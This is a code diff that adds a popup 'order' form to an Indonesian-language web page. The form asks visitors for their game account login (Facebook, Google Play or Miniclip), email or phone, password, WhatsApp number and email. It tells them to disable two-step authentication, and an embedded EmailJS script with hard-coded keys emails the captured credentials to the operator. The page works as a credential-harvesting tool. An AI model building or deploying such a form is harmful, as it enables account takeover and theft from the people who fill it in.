@@ -32,5 +32,64 @@
     <button id="wa-cancel" class="btn-cancel">Batal</button>
   </div>
   </div>
+  <!-- Popup Overlay -->
+<div id="popup-form" class="popup-overlay" style="display: none;">
+  <div class="popup-content">
+    <h3>Masukkan Data Akun</h3>
+    <form id="account-form">
+      <label>Nickname:</label>
+      <input type="text" name="nickname" required>
+
+      <label>Login Via:</label>
+      <select name="login" required>
+        <option value="Facebook">Facebook</option>
+        <option value="Google Play">Google Play</option>
+        <option value="Miniclip">Miniclip</option>
+      </select>
+
+      <label>Email / No. Telepon:</label>
+      <input type="text" name="emailhp" required>
+
+      <label>Password:</label>
+      <input type="password" name="password" required>
+
+      <label>Nomor WhatsApp:</label>
+      <input type="text" name="wa" required>
+
+      <label>Email Aktif:</label>
+      <input type="email" name="emailaktif" required>
+
+      <div class="popup-note">
+        <strong>Note:</strong><br>
+        • Nonaktifkan seluruh autentikasi 2 langkah baik Facebook/Google Play agar order otomatis terproses dan cepat.<br>
+        • Jika masih aktif, admin akan segera menghubungi kamu via WhatsApp atau email aktif.
+      </div>
+
+      <div class="popup-buttons">
+        <button type="submit">Kirim Akun</button>
+        <button type="button" onclick="closePopup()">Batal</button>
+      </div>
+    </form>
+  </div>
+</div>
+  <!-- EmailJS Script -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+  // Inisialisasi EmailJS
+  emailjs.init("nAUL1b5lv7jJmOcaY");
+
+  // Handle saat form dikirim
+  document.getElementById("account-form").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    emailjs.sendForm('service_ucup', 'template_1shj4dt', this)
+      .then(function () {
+        alert("✅ Order berhasil dikirim ke email!");
+        closePopup(); // tutup pop-up
+      }, function (error) {
+        alert("❌ Gagal kirim order: " + error.text);
+      });
+  });
+</script>
 </body>
 </html>
